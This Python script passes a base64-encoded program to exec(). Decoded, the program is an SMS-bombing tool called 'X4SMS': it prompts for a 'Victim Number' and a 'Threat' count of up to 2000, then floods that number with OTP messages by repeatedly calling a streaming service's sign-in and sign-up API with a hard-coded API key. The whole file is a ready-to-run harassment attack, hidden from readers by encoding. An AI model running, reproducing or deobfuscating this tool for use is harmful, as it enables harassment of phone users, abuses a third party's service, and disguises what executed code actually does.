import base64
exec(base64.b64decode('IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMwppbXBvcnQgcmVxdWVzdHMgYXMgeDRjawpmcm9tIG9zIGltcG9ydCBzeXN0ZW0gYXMgb3NzCm9zcygnY2xlYXIgJiYgdG9pbGV0IC1mIG1vbm8xMiAtRiBnYXkgIlg0U01TIicpCmRlZiBzZW5kKHRhcmdldCk6CiAgaGVhZGVyID0gewogICAgIngtYXBpLWtleSI6ICJkdEdLUklBZDd5M213bXVYR2s2M3UzTUkzQXpsMWlZWDh3OWthZWczIgogIH0KCiAgZGF0YSA9IHsKICAgICJyZXF1ZXN0VHlwZSI6InNlbmQiLAogICAgInBob25lTnVtYmVyIjoiKzg4Iit0YXJnZXQsCiAgICAic2NyZWVuTmFtZSI6InNpZ25pbiIKICB9CgogIHVybCA9ICJodHRwczovL3Byb2QtYXBpLnZpZXdsaWZ0LmNvbS9pZGVudGl0eS9zaWduaW4/c2l0ZT1ob2ljaG9pdHYmZGV2aWNlSWQ9YnJvd3Nlci00NDA2N2VhYi01MzM3LTk5ZDgtMTFlYi05OWNhMWU0ZGIxODYiCiAgcmVzID0geDRjay5wb3N0KHVybCwganNvbj1kYXRhLCBoZWFkZXJzPWhlYWRlcikKICBpZiByZXMuanNvbigpLmdldCgiY29kZSIpOgogICAgZGF0YSA9IHsKICAgICAgInJlcXVlc3RUeXBlIjoic2VuZCIsCiAgICAgICJwaG9uZU51bWJlciI6Iis4OCIrdGFyZ2V0LAogICAgICAiZW1haWxDb25zZW50IjoidHJ1ZSIsCiAgICAgICJ3aGF0c2FwcENvbnNlbnQiOiJ0cnVlIiwKICAgICAgImVtYWlsIjoiY2ljYXM5NDQxN0BpY29ubWxlLmNvbSIKICAgIH0KICAgIHVybCA9ICJodHRwczovL3Byb2QtYXBpLnZpZXdsaWZ0LmNvbS9pZGVudGl0eS9zaWdudXA/c2l0ZT1ob2ljaG9pdHYiCgogICAgcmVzID0geDRjay5wb3N0KHVybCwganNvbj1kYXRhLCBoZWFkZXJzPWhlYWRlcikKICAgIGlmIG5vdCByZXMuanNvbigpLmdldCgic2VudCIpOiByZXR1cm4gRmFsc2UKICByZXR1cm4gVHJ1ZQoKZGVmIG1haW4oKToKICB0YXJnZXQgPSBpbnB1dCgiXG5cblwwMzNbMTs5M21bKl0gVmljdGltIE51bWJlcjogIikKICBhbW91bnQgPSBpbnQoaW5wdXQoIlwwMzNbMTs5Nm1bKl0gVGhyZWF0IChNYXggMjAwMCkgOiAiKSkKICBwcmludCgnXG5QbGVhc2Ugd2FpdCB4NHNtcyBpcyBzdGFydGluZy4uLicpCiAgc2VudCwgbnNlbnQgPSAwLCBhbW91bnQKICBmb3IgaSBpbiByYW5nZSgxLCBhbW91bnQgKyAxKToKICAgIHRyeToKICAgICAgc2VuZCh0YXJnZXQpCiAgICAgIHNlbmQodGFyZ2V0KQogICAgICBzZW5kKHRhcmdldCkKICAgICAgaWYgc2VuZCh0YXJnZXQpOgogICAgICAgIHByaW50KGYiW0lEOiB7aX1dIFNNUyBTZW50ISIpCiAgICAgICAgc2VudCArPSAxCiAgICAgICAgbnNlbnQgLT0gMQogICAgICBlbHNlOgogICAgICAgIHByaW50KGYiW0lEOiB7aX1dIFNNUyBOb3QgU2VudC4uLiIpCiAgICBleGNlcHQgS2V5Ym9hcmRJbnRlcnJ1cHQ6IGJyZWFrCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6IHByaW50KGUpOyBicmVhawogIHByaW50KGYiXG5bKl0gVG90YWwgVGhyZWF0IDoge2Ftb3VudH1cblsrXSBTZW50OiB7c2VudH1cblstXSBOb3QgU2VudDoge25zZW50fSIpCgppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogIG1haW4oKQ=='))